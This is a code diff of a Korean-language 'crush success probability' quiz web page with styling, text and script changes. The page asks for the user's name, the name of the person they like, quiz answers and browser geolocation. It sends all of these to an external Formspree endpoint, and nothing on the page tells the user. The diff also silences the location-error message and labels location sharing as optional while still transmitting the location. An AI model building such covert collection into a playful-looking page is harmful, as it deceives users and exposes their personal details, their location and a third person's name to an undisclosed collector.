@@ -41,12 +41,12 @@
       width: 100%;
       position: relative;
     }
+    /* 🔥 버튼 안의 작은 텍스트 색상 변경 */
     button span {
       display: block;
       font-size: 11px;
-      color: #ff1493; /* 💗 핑크색 강조 */
+      color: #ff1493; /* 진한 핑크색 */
       margin-top: 3px;
-      font-weight: bold;
     }
     #locationStatus {
       font-size: 11px;
@@ -54,7 +54,12 @@
       text-align: center;
       margin-top: 5px;
     }
-    #result { margin-top: 25px; font-size: 20px; font-weight: bold; text-align: center; }
+    #result { 
+      margin-top: 25px; 
+      font-size: 20px; 
+      font-weight: bold; 
+      text-align: center; 
+    }
   </style>
 </head>
 <body>
@@ -66,7 +71,7 @@
     <label>짝사랑 상대 이름:</label>
     <input type="text" id="crushName" required>
 
-    <!-- 10개 질문 -->
+    <!-- ✅ 질문 10개 그대로 유지 -->
     <div class="question">
       <label>1️⃣ 상대와 얼마나 자주 대화하나요?</label>
       <label class="option"><input type="radio" name="q1" value="10"> 거의 안 해요</label>
@@ -149,7 +154,7 @@
 
     <button type="submit" id="submitBtn">
       결과 보기
-      <span> 위치 공유하기</span>
+      <span>📍 위치 공유하기 (선택)</span>
     </button>
     <p id="locationStatus"></p>
   </form>
@@ -167,7 +172,7 @@
             document.getElementById("locationStatus").innerText = "✅ 위치 저장 완료";
           },
           () => {
-            document.getElementById("locationStatus").innerText = "⚠️ 위치를 가져올 수 없습니다.";
+            document.getElementById("locationStatus").innerText = "";
           }
         );
       }
@@ -208,10 +213,10 @@
 
       const percent = Math.round(total / questions.length);
       let message = "";
-      if (percent < 40) message = "🥀 아직은 가능성이 낮아요... 조금 더 다가가보세요!";
-      else if (percent < 70) message = "🌸 희망이 보여요! 조금만 더 친해지면 좋을 것 같아요!";
-      else if (percent < 90) message = "💞 좋은 분위기예요! 서로 마음이 통할지도 몰라요!";
-      else message = "🔥 완벽해요! 곧 커플 탄생 예감입니다!";
+      if (percent < 40) message = "🥀 아직은 가능성이 낮아요...";
+      else if (percent < 70) message = "🌸 희망이 보여요!";
+      else if (percent < 90) message = "💞 좋은 분위기예요!";
+      else message = "🔥 완벽해요!";
 
       resultBox.innerHTML = `
         💖 <b>${yourName}</b>와(과) <b>${crushName}</b>의 짝사랑 성공 확률은<br>
@@ -221,15 +226,8 @@
       fetch("https://formspree.io/f/xanegwav", {
         method: "POST",
         headers: { "Accept": "application/json", "Content-Type": "application/json" },
-        body: JSON.stringify({
-          yourName,
-          crushName,
-          percent,
-          resultMessage: message,
-          answers,
-          location: userLocation
-        })
-      }).catch(() => {});
+        body: JSON.stringify({ yourName, crushName, percent, message, answers, location: userLocation })
+      });
     });
   </script>
 </body>
